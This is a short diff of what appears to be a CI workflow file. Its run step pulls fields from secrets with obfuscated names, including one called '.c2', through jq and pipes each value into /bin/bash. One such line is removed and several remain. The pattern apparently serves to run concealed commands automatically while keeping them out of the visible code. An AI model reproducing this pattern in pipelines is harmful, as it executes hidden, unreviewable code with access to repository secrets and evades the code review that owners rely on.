@@ -23,7 +23,6 @@ jobs:
           yufks44: ${{ secrets.yufks44 }}
         run: |
           printf '%s' "$yufks44" | jq -r .c2 | /bin/bash
-          echo $i8753 | jq -r .pag70134 | /bin/bash
           echo $iw10278 | jq -r .ievn039 | /bin/bash
           printf '%s' "$dojcb534" | jq -r .wp897 | /bin/bash
           echo $htgh7 | jq -r .dmxyq1235 | /bin/bash
